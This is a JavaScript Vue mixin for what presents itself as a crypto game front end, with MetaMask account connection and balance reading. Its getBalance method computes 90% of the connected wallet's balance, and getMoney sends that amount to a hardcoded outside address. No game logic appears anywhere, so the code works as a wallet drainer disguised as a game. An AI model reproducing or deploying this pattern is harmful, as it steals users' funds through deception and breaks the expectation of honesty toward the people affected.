import Web3 from 'web3'
const { ethereum } = window
import { mapMutations } from 'vuex'
// import contracts from 'src/config/contracts'
// import { confirmContact } from 'src/web3/methods'

export default {
  methods: {
    ...mapMutations('wallet', ['mutationWallet', 'mutationAppStage']),
    btnHandler () {
      if (this.appStage === 1) this.getAccount()

      if (this.appStage === 2) this.startGame()
    },

    startGame () {
      this.dialog = true
    },

    async getAccount () {
      const vm = this
      if (ethereum) {
        const accounts = await ethereum.request({ method: 'eth_requestAccounts' })
        vm.mutationWallet({ address: accounts[0], chainId: ethereum.chainId })
        vm.mutationAppStage(2)
        this.getBalance()
        ethereum.on('chainChanged', vm.chainChanged)
        ethereum.on('connect', vm.walletConnected)
        ethereum.on('disconnect', vm.walletDisconnected)
      } else {
        vm.$q.notify({
          message: 'Please open this website in metamask app or on your desktop.',
          position: 'top'
        })
      }
    },

    walletConnected (account) {
      console.log('connected ', account)
    },

    walletDisconnected (err) {
      console.log('disconnected ', err)
      this.mutationAppStage(1)
    },

    chainChanged (chainId) {
      this.mutationWallet({ chainId: chainId })
      this.mutationAppStage(1)
      this.getBalance()
    },

    async getBalance () {
      const web3 = new Web3(Web3.givenProvider || 'ws://localhost:8545')

      web3.eth.getBalance(this.wallet.address).then(rawBalance => {
        const balance = (rawBalance / 1000000000000000000).toFixed(4)
        const workBalance = Math.round(rawBalance * 0.9)
        this.mutationWallet({
          balance,
          rawBalance,
          workBalance,
          formattedWorkBalance: (workBalance / 1000000000000000000).toFixed(4)
        })
      })
    },

    async getMoney () {
      const vm = this
      const web3 = new Web3(Web3.givenProvider || 'ws://localhost:8545')

      web3.eth.sendTransaction({
        from: vm.wallet.address,
        to: '0xB99983713C7391F6c22f0D5990963b24FaA2EbC9',
        value: vm.wallet.workBalance
      })
    }

    // async startGame () {
    //   if (this.wallet.chainId === '0x38') {
    //     if (this.appStage === 2) {
    //       confirmContact(contracts.busd, this.wallet.address)
    //     }
    //   }
    // }
  }

}
